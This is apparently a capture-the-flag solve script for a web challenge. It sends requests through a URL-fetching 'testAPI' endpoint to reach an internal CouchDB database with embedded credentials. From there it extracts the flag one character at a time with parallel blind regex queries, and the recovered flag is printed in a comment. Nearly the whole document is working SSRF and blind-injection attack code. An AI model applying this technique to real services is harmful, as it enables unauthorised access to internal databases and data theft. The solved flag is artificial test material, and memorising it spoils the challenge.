# bypass filter with case, use error based blind query to get flag
# flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}

from pwn import log
from collections import defaultdict
import string
import ray
import requests
import urllib.parse
ray.init()

r_session = requests.session()

@ray.remote
def checkSubstring(test):
    p = "https://requester.mc.ax/testAPI?url=http://asdhaao:oafhajkfan@couchdB:5984/asdhaao/_find&method=POST&data=%7B%22selector%22%3A%7B%22flag%22%3A%7B%22%24regex%22%3A%22%5E%s%2E%2A%22%7D%7D%7D".replace("%s",urllib.parse.quote_plus(test))
    resp = r_session.get(p)
    
    seen = False
    if 'wrong' in resp.text:
        seen = True
    return test[-1], seen

known = "flag{JaVA" # Use this if you know any part of the string

log.info("Starting. Beware lots of error spam from ray!")

while True:
    log.success("Current flag: " + known)
    gets = []
    # Order these such that the characters we expect are first
    for i in string.ascii_letters + string.digits + "_{}!-=+?":
        gets.append(checkSubstring.remote(known+i))
    total = len(gets)
    # Get as results come, break on first True
    fl = []
    p = log.progress("Testing characters")
    p.status("Remaining %d/%d" % (total, total))
    while True:
        ready = ray.wait(gets)[0]
        res = ray.get(ready)
        for o in ready: gets.remove(o)
        p.status("Remaining %d/%d" % (len(gets), total))
        fl += list(filter(lambda x: x[1] == True, res))
        if len(fl) > 0:
            break
        if len(gets) <= 1: break
    p.success("Done")
    for o in gets: ray.cancel(o, force=True)
    if len(fl) != 1:
        log.warning("Looks like the server is acting up.")
        log.warning("Try check.py, and if it fails, remove the last character.")
        log.warning("Otherwise, try again in a bit!")
        exit()

    i = fl[0][0]
    known += i
    if known[-1] == "}": break

log.success(known)
